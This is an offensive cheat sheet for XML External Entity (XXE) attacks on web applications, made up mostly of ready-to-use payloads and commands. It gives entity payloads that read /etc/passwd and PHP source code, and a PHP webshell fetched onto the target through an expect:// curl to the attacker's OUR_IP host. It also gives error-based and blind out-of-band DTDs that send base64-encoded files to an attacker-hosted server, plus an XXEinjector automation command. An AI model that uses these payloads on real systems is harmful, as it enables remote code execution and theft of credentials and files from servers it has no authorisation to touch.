XXE = XML External Entity
## Overview
On webpages, sometimes during a POST we can input information that utilizes XML
Example Form
```xml
<?xml version = "1.0"?>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			banana
		</item>
	</order>
```

We can abuse these forms using XXEs
General syntax
```xml
<!DOCTYPE var1 [
<!ENTITY var2 "some random text here">
]>
```

Example of XXE attack
```xml
<?xml version = "1.0"?>
	<!DOCTYPE foo [
	<!ENTITY example "get pwned xD">
	]>
	<order>
		<quantity>
	        4
		</quantity>
		<item>
			&example;
		</item>
	</order>
```
when we POST this, instead of printing "banana", it will print "get pwned xD"

## Local File Disclosure
NOTE: DO NOT FORGET TARGETS CAN ALSO BE WINDOWS

Reading Sensitive Files
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'file:///etc/passwd'>
]>
```
This is an example... consider ssh keys as well, just like you would an LFI

Reading Source Code
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM 'php://filter/convert.base64-encode/resource=<file>.php'>
]>
```

XXE RCE
```bash
# Create webshell php file and host it
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
python3 -m http.server 80
```
```xml
<!DOCTYPE var1 [
<!ENTITY var2 SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

## Advanced File Disclosure

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag 

Advanced Exfiltration with CDATA
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">                         <!-- prepend CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/FILE.php">   <!-- external file -->
  <!ENTITY % end "]]>">                              <!-- end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">       <!-- reference DTD -->
  %xxe;
]>
...
<email>&joined;</email>   <!-- reference &joined; entity to print file content -->
```


Another situation we may find ourselves in is one where the web application might not write any output. If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit

Error Based XXE - (Out-of-band Attack)
```xml
<!-- Send malformed data to get an error. ie: <roo> instead of <root> -->

<?xml version = "1.0"?>
	<roo>
		...
```
```bash
# make dtd file and host
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
echo '<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' >> xxe.dtd
python3 -m http.server 8000
```
```xml
<!-- payload to send  -->

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
If errors don't even print, you can try proceeding to next attack.

If there is no way to have anything printed, we can request the web app to send a web request to our web server with the content of the file, instead of outputting to an XML entity

Blind Out-of-band Data Exfiltration
```bash
# Write php code to detect, decode, and output encoded content
vim index.php

<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

# make dtd file and host
echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">' > xxe.dtd
echo '<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">' >> xxe.dtd

# Host PHP Server
php -S 0.0.0.0:8000
```
```xml
<!-- XXE Payload to insert  -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
Using this, we should catch the data in our terminal

## Automated OOB Exfiltration

[XXEinjector](https://github.com/enjoiz/XXEinjector)
```bash
# Setup
git clone https://github.com/enjoiz/XXEinjector.git

# Copy HTTP Request from Burp > write to file... replace XML data with XXEINJECT
# EXAMPLE
POST /blind/submitDetails.php HTTP/1.1
...SNIP...

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

# Run Tool
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/path/to/file/we/wrote --path=/file/to/read --oob=http --phpfilter

# Read output
check Logs folder
```